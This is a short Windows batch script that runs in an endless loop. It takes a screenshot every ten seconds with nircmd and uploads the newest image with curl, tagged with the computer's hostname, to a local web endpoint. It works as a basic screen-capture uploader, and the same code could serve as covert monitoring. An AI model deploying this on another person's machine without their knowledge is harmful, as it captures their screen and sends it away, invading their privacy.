:loop
hostname > c:/host.txt
set /p USER=<c:/host.txt
set form="pc=%USER%"
set fn=%random%.jpg
nircmd.exe cmdwait 10000 savescreenshot %fn%
FOR /F %%i IN ('dir *jpg /b /O-D') DO (
    SET file=%%i
    GOTO send
)
:send
curl -F "data=@%file%" -F %form% http://localhost:6060/api/photo
goto loop
 